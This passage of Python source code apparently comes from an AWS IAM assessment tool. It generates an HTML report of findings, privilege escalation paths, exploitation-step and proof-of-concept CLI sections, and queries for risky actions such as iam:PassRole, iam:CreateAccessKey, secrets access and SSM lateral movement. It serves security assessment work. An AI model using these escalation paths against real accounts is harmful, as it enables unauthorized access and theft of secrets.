                    <button class="graph-btn" onclick="exportGraph('svg')" title="Export as SVG">SVG</button>
                </div>
            </div>
            <div class="graph-canvas">
                <div class="graph-loading">Loading graph...</div>
                <div class="graph-search">
                    <input type="text" placeholder="Search principals..." oninput="graphSearch(this.value)">
                </div>
                <div class="graph-stats">-- nodes | -- edges</div>
                <div class="graph-toolbar">
                    <button class="graph-zoom-btn" onclick="graphZoom(1.3)" title="Zoom In">+</button>
                    <button class="graph-zoom-btn" onclick="graphZoom(0.7)" title="Zoom Out">-</button>
                    <button class="graph-zoom-btn" onclick="graphFit()" title="Fit View">&#8644;</button>
                    <button class="graph-zoom-btn" onclick="graphCenter()" title="Center">&#8857;</button>
                </div>
                <div id="cy" style="width:100%;height:100%"></div>
                <div class="graph-info"></div>
                <div class="owned-panel">
                    <div class="owned-panel-title">&#128274; Owned Principals</div>
                    <div class="owned-panel-list"></div>
                    <button class="owned-panel-clear" onclick="clearOwned()">Clear All Owned</button>
                </div>
                <div class="path-details-panel" id="path-details">
                    <div class="path-details-title">
                        <span>Attack Paths</span>
                        <span class="path-details-close" onclick="closePathDetails()">&times;</span>
                    </div>
                    <div class="path-details-count"></div>
                    <div class="path-details-list"></div>
                </div>
            </div>
            <div class="graph-legend">
                <div class="legend-item"><div class="legend-dot admin"></div>Admin (Full Access)</div>
                <div class="legend-item"><div class="legend-dot shadow"></div>Shadow Admin</div>
                <div class="legend-item"><div class="legend-dot user"></div>IAM User</div>
                <div class="legend-item"><div class="legend-dot role"></div>IAM Role</div>
                <div class="legend-item"><div class="legend-dot group"></div>IAM Group</div>
                <div class="legend-item"><div class="legend-dot owned"></div>Owned (Compromised)</div>
                <span style="color:#4a4a6a;margin:0 8px">|</span>
                <div class="legend-item" style="color:#e94560">&#8594; Critical escalation path</div>
                <div class="legend-item" style="color:#ff9800">&#8594; High severity path</div>
                <div class="legend-item" style="color:#22c55e">&#8594; Attack path from owned</div>
            </div>
        </div>
            </div><!-- End graph section -->

            <!-- Findings Section -->
            <div class="content-section" id="section-findings">
                <h2 style="margin-bottom:20px;font-size:18px">All Findings</h2>
"""

        if cross_account_findings:
            html += cls._render_cross_account_section(cross_account_findings)

        for analysis in analyses:
            for finding in analysis.findings:
                html += cls._render_finding(finding, f"f{analysis.account_id}")

        html += """
            </div><!-- End findings section -->

            <!-- Paths Section -->
            <div class="content-section" id="section-paths">
                <h2 style="margin-bottom:20px;font-size:18px">Privilege Escalation Paths</h2>
"""

        all_paths = []
        for analysis in analyses:
            all_paths.extend(analysis.escalation_paths)
        if all_paths:
            html += cls._render_escalation_paths(all_paths, "all")

        html += """
            </div><!-- End paths section -->

            <!-- Principals Section -->
            <div class="content-section" id="section-principals">
                <h2 style="margin-bottom:20px;font-size:18px">All Principals</h2>
                <div class="principal-controls" style="display:flex;gap:12px;margin-bottom:20px;flex-wrap:wrap;align-items:center">
                    <div class="filter-group" style="display:flex;gap:6px;flex-wrap:wrap">
                        <button class="filter-btn active" onclick="filterPrincipalsTable('all')" data-filter="all">All</button>
                        <button class="filter-btn" onclick="filterPrincipalsTable('admin')" data-filter="admin">Admin Only</button>
                        <button class="filter-btn" onclick="filterPrincipalsTable('shadow')" data-filter="shadow">Shadow Admin</button>
                        <button class="filter-btn" onclick="filterPrincipalsTable('dangerous')" data-filter="dangerous">Has Dangerous Actions</button>
                    </div>
                    <div style="margin-left:auto;display:flex;gap:8px">
                        <button class="export-btn" onclick="exportPrincipalsTable('csv')">Export CSV</button>
                        <button class="export-btn" onclick="exportPrincipalsTable('json')">Export JSON</button>
                    </div>
                </div>
"""

        for analysis in analyses:
            html += f"""
                <h3 style="margin:16px 0 12px;font-size:14px">Account: {analysis.account_id}</h3>
                <table class="trust-table principals-table" style="margin-bottom:24px">
                    <thead>
                        <tr>
                            <th>Name</th>
                            <th>Type</th>
                            <th>Admin</th>
                            <th>Shadow Admin</th>
                            <th>Capabilities</th>
                        </tr>
                    </thead>
                    <tbody>
"""
            shadow_arns = {p.arn for p in analysis.shadow_admins}
            overperm_arns = {p.arn for p in analysis.overly_permissive}
            for arn, principal in sorted(analysis.principals.items(), key=lambda x: (not x[1].is_admin, x[1].name)):
                is_shadow = arn in shadow_arns
                cap_count = len(principal.dangerous_actions) if principal.dangerous_actions else 0
                is_admin = principal.is_admin
                data_attrs = f'data-admin="{str(is_admin).lower()}" data-shadow="{str(is_shadow).lower()}" data-dangerous="{str(cap_count > 0).lower()}"'
                html += f"""
                        <tr {data_attrs}>
                            <td><code>{cls._escape(principal.name)}</code></td>
                            <td>{principal.principal_type}</td>
                            <td>{'<span class="badge critical">Yes</span>' if is_admin else 'No'}</td>
                            <td>{'<span class="badge high">Yes</span>' if is_shadow else 'No'}</td>
                            <td>{cap_count} dangerous actions</td>
                        </tr>
"""
            html += """
                    </tbody>
                </table>
"""

        html += """
            </div><!-- End principals section -->

            <!-- Query Results Section -->
            <div class="content-section" id="section-queries">
                <h2 style="margin-bottom:20px;font-size:18px">PMapper-Style Query Results</h2>
                <p style="color:var(--tx2);margin-bottom:24px;font-size:13px">
                    Automatic analysis using PMapper-compatible queries. Shows which principals can perform critical actions.
                </p>
"""

        html += cls._render_query_results(analyses)

        html += """
            </div><!-- End queries section -->
"""

        for i, analysis in enumerate(analyses):
            html += f"""
            <div class="content-section" id="section-account-{i}">
                <h2 style="margin-bottom:20px;font-size:18px">Account: {analysis.account_id}</h2>
"""
            html += cls._render_account_section(analysis, i)
            html += """
            </div>
"""

        html += f"""
            <div style="height:60px"></div><!-- Spacer for fixed footer -->
        </div><!-- End main -->
    </div><!-- End main-wrapper -->

    <script>{cls.JS}</script>
    <script>{cls.GRAPH_JS}</script>
    <script>
        // Section switching
        function showSection(sectionId) {{
            // Hide all sections
            document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
            // Show target section
            const target = document.getElementById('section-' + sectionId);
            if (target) target.classList.add('active');
            // Update sidebar active state
            document.querySelectorAll('.sidebar-link').forEach(l => l.classList.remove('active'));
            const activeLink = document.querySelector('.sidebar-link[data-section="' + sectionId + '"]');
            if (activeLink) activeLink.classList.add('active');
            // Reinitialize graph if showing graph section
            if (sectionId === 'graph' && cy) {{
                setTimeout(() => cy.resize(), 100);
            }}
        }}

        // Initialize graph with data
        document.addEventListener('DOMContentLoaded', function() {{
            const graphData = {graph_json};
            initGraph(graphData);
        }});
    </script>

    <!-- Policy Data Registration -->
    {policy_scripts}

    <!-- Policy Viewer Modal -->
    <div id="policy-viewer" class="policy-viewer">
        <div class="policy-viewer-content">
            <div class="policy-viewer-header">
                <div>
                    <div class="policy-viewer-title"></div>
                    <div class="policy-viewer-arn"></div>
                </div>
                <button class="policy-viewer-close" onclick="closePolicy()">&times;</button>
            </div>
            <div class="policy-viewer-body">
                <pre class="policy-code"></pre>
            </div>
            <div class="policy-viewer-footer">
                <div class="policy-viewer-legend">
                    <span><span class="issue-dot"></span> Dangerous permissions highlighted</span>
                </div>
                <button class="copy-btn" onclick="copyPolicyJson()">Copy JSON</button>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="site-footer">
        <div>
            Made with <span style="color:#e94560">&hearts;</span> by
            <a href="https://github.com/dr34mhacks" target="_blank">Sid</a>
        </div>
        <div>
            Built on the shoulders of
            <a href="https://github.com/nccgroup/PMapper" target="_blank">PMapper</a>
            by NCC Group
        </div>
    </footer>
</body>
</html>"""

        with open(output_path, "w") as f:
            f.write(html)

        print(f"[+] HTML report: {output_path}")

    @classmethod
    def _render_cross_account_section(cls, findings: List[Finding]) -> str:
        """Render cross-account findings section."""
        html = """
        <div class="account-section" id="as-cross">
            <div class="account-header" onclick="toggleAccount('cross')">
                <div class="account-header-left">
                    <span class="account-chevron" id="ac-cross">&#9654;</span>
                    <div>
                        <span class="account-name">Cross-Account Analysis</span>
                        <span class="account-meta">Trust relationships across all accounts</span>
                    </div>
                </div>
                <span class="badge high">Attention Required</span>
            </div>
            <div class="account-body" id="ab-cross">
"""

        for finding in findings:
            html += cls._render_finding(finding, "cross")

        html += """
            </div>
        </div>
"""
        return html

    @classmethod
    def _render_account_section(cls, analysis: AccountAnalysis, index: int) -> str:
        """Render a single account section."""
        aid = f"a{index}"
        severity = "critical" if any(f.severity == "critical" for f in analysis.findings) else \
                   "high" if any(f.severity == "high" for f in analysis.findings) else "medium"

        html = f"""
        <div class="account-section" id="as-{aid}">
            <div class="account-header" onclick="toggleAccount('{aid}')">
                <div class="account-header-left">
                    <span class="account-chevron" id="ac-{aid}">&#9654;</span>
                    <div>
                        <span class="account-name">{cls._escape(analysis.account_id)}</span>
                        <span class="account-meta">{analysis.node_count} principals | {analysis.admin_count} admins | {len(analysis.escalation_paths)} paths</span>
                    </div>
                </div>
                <span class="badge {severity}">{len(analysis.findings)} findings</span>
            </div>
            <div class="account-body" id="ab-{aid}">
"""

        if not analysis.findings and not analysis.escalation_paths:
            html += '<div class="no-findings">No significant findings identified</div>'
        else:
            for finding in analysis.findings:
                html += cls._render_finding(finding, aid)

            if analysis.escalation_paths:
                html += cls._render_escalation_paths(analysis.escalation_paths, aid)

            if analysis.cross_account_trusts:
                html += cls._render_trust_table(analysis.cross_account_trusts, aid)

        html += """
            </div>
        </div>
"""
        return html

    @classmethod
    def _render_finding(cls, finding: Finding, prefix: str) -> str:
        """Render a single finding with comprehensive pentest reporting details."""
        fid = f"{prefix}_{finding.id}"

        finding_type = finding.id.split("_", 1)[-1] if "_" in finding.id else finding.category
        guidance = get_exploitation_guidance(finding_type)

        principals_detail = finding.details.get("principals_detail", [])

        principals_html = ""
        if finding.category == "credential_hygiene" and finding.details.get("issues"):
            principals_html = cls._render_credential_hygiene(finding.details["issues"])
        elif finding.category == "trust" and finding.details.get("trusts"):
            principals_html = cls._render_trust_detail(finding.details["trusts"])
        elif principals_detail and finding.category == "iam":
            principals_html = cls._render_principals_with_capabilities(principals_detail, finding)
        elif finding.principals:
            show_limit = 5
            principals_html = '<div class="affected-principals">'
            principals_html += '<div class="affected-principals-header">'
            principals_html += f'<span style="font-size:10px;color:var(--tx2)">{len(finding.principals)} affected</span>'
            arns_escaped = cls._escape(chr(10).join(finding.principals))
            principals_html += f'<button class="copy-btn" data-copy="{arns_escaped}" onclick="copyText(this)">Copy All ARNs</button>'
            principals_html += '</div>'

            for i, p in enumerate(finding.principals):
                ptype = "role" if ":role/" in p else "user"
                pname = p.split("/")[-1]
                hidden_class = "principals-hidden" if i >= show_limit else ""
                principals_html += f'''<div class="principal-card {hidden_class}" data-principal-idx="{fid}">
                    <div class="principal-card-left">
                        <div class="principal-card-icon {ptype}">{'R' if ptype == 'role' else 'U'}</div>
                        <div class="principal-card-info">
                            <div class="principal-card-name">{cls._escape(pname)}</div>
                            <div class="principal-card-arn" title="{cls._escape(p)}">{cls._escape(p)}</div>
                        </div>
                    </div>
                    <div class="principal-card-actions">
                        <button class="copy-arn-btn" onclick="event.stopPropagation();copyArn(this,\'{cls._escape_js(p)}\')">Copy ARN</button>
                    </div>
                </div>'''

            if len(finding.principals) > show_limit:
                principals_html += f'''<button class="show-more-btn" onclick="togglePrincipals(this, '{fid}')" data-showing="false">
                    Show {len(finding.principals) - show_limit} more principals
                </button>'''
            principals_html += '</div>'

        impact_details = guidance.get("impact", {})
        impact_html = f'''<p><strong>Business Impact:</strong> {cls._escape(impact_details.get("business", finding.impact))}</p>'''
        if impact_details.get("confidentiality"):
            impact_html += f'''<p style="font-size:12px;margin-top:8px"><strong>Confidentiality:</strong> {cls._escape(impact_details["confidentiality"])}</p>'''
        if impact_details.get("integrity"):
            impact_html += f'''<p style="font-size:12px"><strong>Integrity:</strong> {cls._escape(impact_details["integrity"])}</p>'''
        if impact_details.get("availability"):
            impact_html += f'''<p style="font-size:12px"><strong>Availability:</strong> {cls._escape(impact_details["availability"])}</p>'''

        exploit_steps = guidance.get("exploitation_steps", [])
        exploit_html = ""
        if exploit_steps:
            exploit_html = '<ol style="margin:0;padding-left:20px;font-size:12px;line-height:1.8">'
            for step in exploit_steps:
                step_text = step.split(". ", 1)[-1] if ". " in step else step
                exploit_html += f'<li>{cls._escape(step_text)}</li>'
            exploit_html += '</ol>'

        cli_commands = guidance.get("aws_cli_commands", "")
        cli_html = ""
        if cli_commands:
            highlighted = cls._syntax_highlight_cli(cli_commands)

            cli_html = f'''
            <div class="cli-block">
                <div class="cli-block-header">
                    <button class="copy-btn" onclick="copyText(this)">Copy</button>
                </div>
                <div class="cli-code">{highlighted}</div>
            </div>
            '''

        evidence = guidance.get("evidence", "")
        evidence_html = ""
        if evidence:
            evidence_html = f'''<p style="font-size:12px;background:var(--bg3);padding:10px;border-radius:6px;margin-top:8px;font-family:var(--mono)">{cls._escape(evidence)}</p>'''

        refs = guidance.get("references", [])
        refs_html = ""
        if refs:
            refs_html = '<div style="margin-top:12px;font-size:11px;color:var(--tx2)"><strong>References:</strong><br>'
            for ref in refs:
                refs_html += f'<a href="{cls._escape(ref)}" target="_blank" style="color:var(--primary);text-decoration:none">{cls._escape(ref)}</a><br>'
            refs_html += '</div>'

        cvss = guidance.get("cvss_estimate", "")
        cvss_vector = guidance.get("cvss_vector", "")
        cvss_html = f'<span style="font-family:var(--mono);font-size:10px;color:var(--cr);margin-left:8px">{cls._escape(cvss)}</span>' if cvss else ""
        cvss_vector_html = (f'<p style="font-size:11px;margin-top:6px"><strong>CVSS v3.1:</strong> '
                            f'<code style="font-size:10px">{cls._escape(cvss_vector)}</code></p>') if cvss_vector else ""

        how_to_report = cls._render_how_to_report(finding, guidance, cvss, cvss_vector)

        return f"""
            <div class="finding severity-{finding.severity}" id="f-{fid}">
                <div class="finding-header" onclick="toggleFinding('{fid}')">
                    <div class="finding-header-left">
                        <span class="finding-chevron" id="fc-{fid}">&#9654;</span>
                        <span class="finding-title">{cls._escape(finding.title)}</span>
                    </div>
                    <div style="display:flex;align-items:center;gap:8px">
                        <span class="badge {finding.severity}">{finding.severity}</span>
                        {cvss_html}
                    </div>
                </div>
                <div class="finding-body" id="fb-{fid}">
                    <div class="finding-grid">
                        <div class="finding-section">
                            <h4>Description</h4>
                            <p>{cls._escape(guidance.get("description", finding.description))}</p>
                        </div>
                        <div class="finding-section">
                            <h4>Impact Assessment</h4>
                            {impact_html}
                        </div>
                    </div>
                    <div class="finding-grid">
                        <div class="finding-section">
                            <h4>Affected Principals ({len(finding.principals)})</h4>
                            {principals_html}
                        </div>
                        <div class="finding-section">
                            <h4>Exploitation Steps</h4>
                            {exploit_html if exploit_html else f'<p style="font-size:12px;color:var(--tx2)">See AWS CLI commands below</p>'}
                        </div>
                    </div>
                    <div class="finding-section" style="margin-top:16px">
                        <h4>AWS CLI Commands (Proof of Concept)</h4>
                        <p style="font-size:11px;color:var(--tx2);margin-bottom:8px">Commands for validating or exploiting this finding:</p>
                        {cli_html if cli_html else '<p style="font-size:12px;color:var(--tx2);font-style:italic">No specific commands available</p>'}
                    </div>
                    <div class="finding-grid" style="margin-top:16px">
                        <div class="finding-section">
                            <h4>Evidence to Collect</h4>
                            {evidence_html if evidence_html else '<p style="font-size:12px;color:var(--tx2)">Review the affected principals and their attached policies</p>'}
                        </div>
                        <div class="finding-section">
                            <h4>Remediation</h4>
                            <div class="remediation-box">
                                <p>{cls._escape(finding.remediation)}</p>
                            </div>
                            {cvss_vector_html}
                            {refs_html}
                        </div>
                    </div>
                    {how_to_report}
                </div>
            </div>
"""

    @classmethod
    def _render_how_to_report(cls, finding, guidance, cvss, cvss_vector) -> str:
        """A copy-paste report skeleton so the security team can lift a finding straight
        into an assessment deliverable."""
        title = cls._escape(finding.title)
        sev = finding.severity.upper()
        n = len(finding.principals)
        affected = chr(10).join(finding.principals[:25])
        if len(finding.principals) > 25:
            affected += f"\n... (+{len(finding.principals) - 25} more)"
        evidence = guidance.get("evidence", "See affected principals and their attached policies.")
        remediation = finding.remediation
        report_text = (
            f"Title: {finding.title}\n"
            f"Severity: {sev}" + (f"  |  {cvss}" if cvss else "") + "\n"
            + (f"CVSS: {cvss_vector}\n" if cvss_vector else "")
            + f"\nDescription:\n{guidance.get('description', finding.description)}\n"
            f"\nAffected principals ({n}):\n{affected}\n"
            f"\nEvidence / how to confirm:\n{evidence}\n"
            f"\nBusiness impact:\n{guidance.get('impact', {}).get('business', finding.impact)}\n"
            f"\nRemediation:\n{remediation}\n"
        )
        escaped_copy = cls._escape(report_text)
        return f'''
                    <div class="finding-section" style="margin-top:16px">
                        <h4>How to Report This Finding</h4>
                        <p style="font-size:11px;color:var(--tx2);margin-bottom:8px">A ready-to-paste skeleton for your assessment report (validate the evidence in the account before submitting):</p>
                        <div class="cli-block">
                            <div class="cli-block-header">
                                <span style="font-size:10px;color:var(--tx2)">report snippet</span>
                                <button class="copy-btn" data-copy="{escaped_copy}" onclick="copyText(this)">Copy</button>
                            </div>
                            <div class="cli-code" style="white-space:pre-wrap">{escaped_copy}</div>
                        </div>
                    </div>'''

    @classmethod
    def _render_credential_hygiene(cls, issues: List[Dict]) -> str:
        """Render credential-hygiene issues (MFA / access keys) as a table."""
        html = '<div class="affected-principals"><div class="affected-principals-header">'
        html += f'<span style="font-size:10px;color:var(--tx2)">{len(issues)} user(s)</span></div>'
        html += '<div class="table-wrapper"><table class="trust-table"><thead><tr>'
        html += '<th>User</th><th>Privileged</th><th>Console PW</th><th>MFA</th><th>Access keys</th><th>Severity</th><th>Issue</th>'
        html += '</tr></thead><tbody>'
        for c in issues:
            mfa = 'Yes' if c.get('has_mfa') else "<span style='color:var(--cr)'>No</span>"
            pw = 'Yes' if c.get('active_password') else 'No'
            priv = '<span class="badge high" style="font-size:8px">Yes</span>' if c.get('privileged') else 'No'
            keys = c.get('num_access_keys', 0)
            keys_html = f"<span style='color:var(--cr)'>{keys}</span>" if keys else "0"
            html += (f"<tr><td><code>{cls._escape(c['name'])}</code></td><td>{priv}</td><td>{pw}</td>"
                     f"<td>{mfa}</td><td style='text-align:center'>{keys_html}</td>"
                     f"<td><span class='badge {c['severity']}'>{c['severity']}</span></td>"
                     f"<td style='font-size:11px'>{cls._escape('; '.join(c.get('flags', [])))}</td></tr>")
        html += '</tbody></table></div></div>'
        return html

    @classmethod
    def _render_trust_detail(cls, trusts: List[Dict]) -> str:
        """Render risky trust relationships (AWS/Federated/Service) with the reason."""
        html = '<div class="affected-principals"><div class="affected-principals-header">'
        html += f'<span style="font-size:10px;color:var(--tx2)">{len(trusts)} trust(s)</span></div>'
        html += '<div class="table-wrapper"><table class="trust-table"><thead><tr>'
        html += '<th>Role</th><th>Kind</th><th>Trusted principal</th><th>Target admin</th><th>Risk</th><th>Why</th>'
        html += '</tr></thead><tbody>'
        for t in trusts:
            tgt = '<span class="badge critical" style="font-size:8px">Yes</span>' if t.get('target_is_admin') else 'No'
            html += (f"<tr><td><code>{cls._escape(t.get('role_name',''))}</code></td>"
                     f"<td>{cls._escape(t.get('principal_kind','AWS'))}</td>"
                     f"<td><code style='font-size:10px'>{cls._escape(str(t.get('trusted_principal',''))[:60])}</code></td>"
                     f"<td>{tgt}</td>"
                     f"<td><span class='badge {t.get('risk_level','medium')}'>{t.get('risk_level','')}</span></td>"
                     f"<td style='font-size:11px'>{cls._escape(t.get('reason',''))}</td></tr>")
        html += '</tbody></table></div></div>'
        return html

    @classmethod
    def _render_principals_with_capabilities(cls, principals_detail: List[Dict], finding: Finding) -> str:
        """Render principals with their capability details in a compact, organized view.

        Uses "show more" button for findings (reveals ALL hidden items).
        Pagination is only used in the Principals tab and Query results.
        """
        fid = finding.id.replace("_", "-")
        all_arns = [p.get("arn", p.get("name", "")) for p in principals_detail]
        show_limit = 6

        is_overperm = "overly_permissive" in finding.id or "overly" in finding.title.lower()

        html = '<div class="affected-principals">'
        html += '<div class="affected-principals-header">'
        html += f'<span style="font-size:10px;color:var(--tx2)">{len(principals_detail)} principals</span>'
        html += '<div class="affected-principals-actions">'
        all_arns_escaped = cls._escape(chr(10).join(all_arns))
        html += f'<button class="copy-btn" data-copy="{all_arns_escaped}" onclick="copyText(this)">Copy All ARNs</button>'
        html += '</div></div>'

        if is_overperm:
            html += '<div class="overperm-grid">'
            for i, pd in enumerate(principals_detail):
                name = pd.get("name", pd.get("arn", "").split("/")[-1])
                arn = pd.get("arn", "")
                ptype = "role" if ":role/" in arn else "user"
                groups = pd.get("capability_groups", [])
                top_group = groups[0].get("group", "Permissions") if groups else "Permissions"

                hidden_class = "principals-hidden" if i >= show_limit else ""
                html += f'''<div class="overperm-chip {hidden_class}" data-principal-idx="{fid}"
                    onclick="copyArn(this.querySelector('.copy-arn-btn'),'{cls._escape_js(arn)}')" title="{cls._escape(arn)}">
                    <div class="overperm-chip-icon">{'R' if ptype == 'role' else 'U'}</div>
                    <div class="overperm-chip-info">
                        <div class="overperm-chip-name">{cls._escape(name)}</div>
                        <div class="overperm-chip-type">{cls._escape(top_group)}</div>
                    </div>
                    <button class="copy-arn-btn" onclick="event.stopPropagation();copyArn(this,'{cls._escape_js(arn)}')" style="display:none">Copy</button>
                </div>'''
            html += '</div>'

            if len(principals_detail) > show_limit:
                html += f'''<button class="show-more-btn" onclick="togglePrincipalsChips(this, '{fid}')" data-showing="false">
                    Show {len(principals_detail) - show_limit} more principals
                </button>'''
        else:
            for i, pd in enumerate(principals_detail[:show_limit]):
                name = pd.get("name", pd.get("arn", "").split("/")[-1])
                arn = pd.get("arn", "")
                ptype = "role" if ":role/" in arn else "user"
                capabilities = pd.get("capabilities", [])
                groups = pd.get("capability_groups", [])
                is_managed = pd.get("managed", False)

                badges_html = ""
                for g in groups[:3]:
                    gsev = g.get("severity", "medium")
                    gname = g.get("group", "")
                    badges_html += f'<span class="badge {gsev}" style="font-size:8px;padding:2px 6px">{cls._escape(gname)}</span>'

                caps_summary = ""
                if capabilities:
                    caps_preview = ", ".join(capabilities[:3])
                    if len(capabilities) > 3:
                        caps_preview += f" (+{len(capabilities)-3})"
                    caps_summary = f'<div style="font-size:10px;color:var(--tx2);margin-top:6px;font-style:italic">Can: {cls._escape(caps_preview)}</div>'

                managed_tag = '<span style="font-size:8px;padding:2px 5px;background:var(--md2);color:#60a5fa;border-radius:3px;margin-left:4px">AWS</span>' if is_managed else ""

                evidence_html = ""
                for ev in pd.get("evidence", [])[:4]:
                    src = ev.get("source", "attached")
                    src_tag = {"group": "via group", "inline": "inline", "admin": "AdministratorAccess"}.get(src, "attached")
                    res = ", ".join(ev.get("resources", ["*"]))[:40]
                    sid = f" Sid:{cls._escape(ev['sid'])}" if ev.get("sid") else ""
                    evidence_html += (f'<div style="font-size:10px;color:var(--tx2);margin-top:3px">'
                                      f'<code style="color:var(--cr)">{cls._escape(ev["action"])}</code> '
                                      f'&larr; {cls._escape(ev.get("policy_name",""))} '
                                      f'<span style="opacity:.7">({cls._escape(src_tag)}{sid}; Resource: {cls._escape(res)})</span></div>')
                if evidence_html:
                    evidence_html = f'<div style="margin-top:6px;border-left:2px solid var(--bd);padding-left:8px">{evidence_html}</div>'
                caveats = []
                if pd.get("boundary_capped"):
                    caveats.append("has a permissions boundary (effective access may be capped)")
                if pd.get("has_notaction"):
                    caveats.append("uses NotAction (review full grant manually)")
                if pd.get("unresolved_managed"):
                    caveats.append(f"{len(pd['unresolved_managed'])} unresolved AWS-managed policy body (capabilities may be understated)")
                caveat_html = ""
                if caveats:
                    caveat_html = f'<div style="font-size:9px;color:var(--hi);margin-top:4px">&#9888; {cls._escape("; ".join(caveats))}</div>'

                policies = pd.get("policies", [])
                policy_btns = ""
                for policy_arn in policies[:5]:
                    is_aws_managed = ":aws:policy/" in policy_arn
                    policy_name = policy_arn.split("/")[-1] if "/" in policy_arn else policy_arn.split(":")[-1]
                    if is_aws_managed:
                        policy_btns += f'''<span class="aws-policy-badge" title="AWS Managed: {cls._escape(policy_name)}">
                            &#9733; {cls._escape(policy_name[:18])}{'...' if len(policy_name) > 18 else ''}
                        </span>'''
                    else:
                        policy_btns += f'''<button class="view-policy-btn" onclick="event.stopPropagation();viewPolicy('{cls._escape_js(policy_arn)}')" title="View {cls._escape(policy_name)}">
                            &#128196; {cls._escape(policy_name[:20])}{'...' if len(policy_name) > 20 else ''}
                        </button>'''

                html += f'''<div class="principal-card">
                    <div class="principal-card-left">
                        <div class="principal-card-icon {ptype}">{'R' if ptype == 'role' else 'U'}</div>
                        <div class="principal-card-info">
                            <div class="principal-card-name">{cls._escape(name)}{managed_tag}</div>
                            <div style="display:flex;gap:4px;margin-top:4px">{badges_html}</div>
                            {caps_summary}
                            {evidence_html}
                            {caveat_html}
                            {f'<div style="display:flex;flex-wrap:wrap;gap:4px;margin-top:6px">{policy_btns}</div>' if policy_btns else ''}
                        </div>
                    </div>
                    <div class="principal-card-actions">
                        <button class="copy-arn-btn" onclick="event.stopPropagation();copyArn(this,'{cls._escape_js(arn)}')">Copy ARN</button>
                    </div>
                </div>'''

            if len(principals_detail) > show_limit:
                for i, pd in enumerate(principals_detail[show_limit:]):
                    name = pd.get("name", pd.get("arn", "").split("/")[-1])
                    arn = pd.get("arn", "")
                    ptype = "role" if ":role/" in arn else "user"

                    html += f'''<div class="principal-card principals-hidden" data-principal-idx="{fid}">
                        <div class="principal-card-left">
                            <div class="principal-card-icon {ptype}">{'R' if ptype == 'role' else 'U'}</div>
                            <div class="principal-card-info">
                                <div class="principal-card-name">{cls._escape(name)}</div>
                                <div class="principal-card-arn">{cls._escape(arn)}</div>
                            </div>
                        </div>
                        <div class="principal-card-actions">
                            <button class="copy-arn-btn" onclick="event.stopPropagation();copyArn(this,'{cls._escape_js(arn)}')">Copy ARN</button>
                        </div>
                    </div>'''

                html += f'''<button class="show-more-btn" onclick="togglePrincipals(this, '{fid}')" data-showing="false">
                    Show {len(principals_detail) - show_limit} more principals
                </button>'''

        html += '</div>'
        return html

    @classmethod
    def _render_query_results(cls, analyses: List['AccountAnalysis']) -> str:
        """Render automatic query results section."""
        html = ""

        AUTO_QUERIES = [
            ("admin", "Administrative Principals", "Principals with full admin access", "#ef4444"),
            ("privesc", "Privilege Escalation", "Non-admins who can reach admin", "#f59e0b"),
            ("secrets", "Secrets Access", "Can read Secrets Manager or SSM parameters", "#8b5cf6"),
            ("ssm", "SSM Lateral Movement", "Can use SSM to access EC2 instances", "#3b82f6"),
            ("cross-account", "Cross-Account Access", "Principals with external trust", "#ec4899"),
        ]

        ACTION_QUERIES = [
            ("iam:CreateAccessKey", "Create Access Keys", "Can create long-term credentials"),
            ("iam:PassRole", "Pass Role", "Can pass roles to services"),
            ("sts:AssumeRole", "Assume Roles", "Can assume other IAM roles"),
            ("lambda:CreateFunction", "Lambda Abuse", "Can create Lambda functions"),
            ("ec2:RunInstances", "EC2 Abuse", "Can launch EC2 instances"),
            ("codebuild:CreateProject", "CodeBuild Abuse", "Can create CodeBuild projects"),
        ]

        for analysis in analyses:
            try:
                qe = QueryEngine(analysis)

                all_results = {}
                for preset_id, title, desc, color in AUTO_QUERIES:
                    results = qe.run_preset(preset_id)
                    if results:
                        all_results[preset_id] = {"title": title, "results": results}

                html += '''
                <div style="margin-bottom:20px;display:flex;align-items:center;gap:10px">
                    <span style="font-size:18px">&#128270;</span>
                    <h3 style="font-size:15px;font-weight:600;color:var(--txb);margin:0">Security Posture Analysis</h3>
                    <span style="font-size:11px;color:var(--tx2);font-family:var(--mono)">Automated PMapper-style queries</span>
                </div>
                <div class="principal-controls">
                    <div class="filter-group">
                        <span class="filter-label">Filter:</span>
                        <button class="filter-btn active" onclick="filterQueries('all', this)">All</button>
                        <button class="filter-btn critical" onclick="filterQueries('admin', this)">Admin</button>
                        <button class="filter-btn high" onclick="filterQueries('privesc', this)">Shadow Admin</button>
                        <button class="filter-btn" onclick="filterQueries('secrets', this)">Secrets</button>
                        <button class="filter-btn" onclick="filterQueries('ssm', this)">SSM</button>
                        <button class="filter-btn" onclick="filterQueries('cross-account', this)">Cross-Account</button>
                    </div>
                    <div class="export-group">
                        <button class="export-btn" onclick="exportPrincipals('csv')" title="Export to CSV">
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
                            CSV
                        </button>
                        <button class="export-btn" onclick="exportPrincipals('json')" title="Export to JSON">
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
                            JSON
                        </button>
                    </div>
                </div>
                '''

                for preset_id, title, desc, color in AUTO_QUERIES:
                    results = qe.run_preset(preset_id)
                    if results:
                        html += cls._render_query_card(title, desc, results, color, preset_id)

                html += '''
                <div style="margin:32px 0 16px;display:flex;align-items:center;gap:10px">
                    <span style="font-size:18px">&#128736;</span>
                    <h3 style="font-size:15px;font-weight:600;color:var(--txb);margin:0">Action-Based Queries</h3>
                    <span style="font-size:11px;color:var(--tx2);font-family:var(--mono)">Who can do specific actions?</span>
                </div>
                '''
                html += '<div class="query-grid">'
                for action, title, desc in ACTION_QUERIES:
                    results = qe.query(f"who can do {action}")
                    html += cls._render_query_mini_card(action, title, len(results), results[:5])
                html += '</div>'

            except Exception as e:
                html += f'<p style="color:var(--tx2)">Query analysis unavailable: {str(e)}</p>'

        return html

    @classmethod
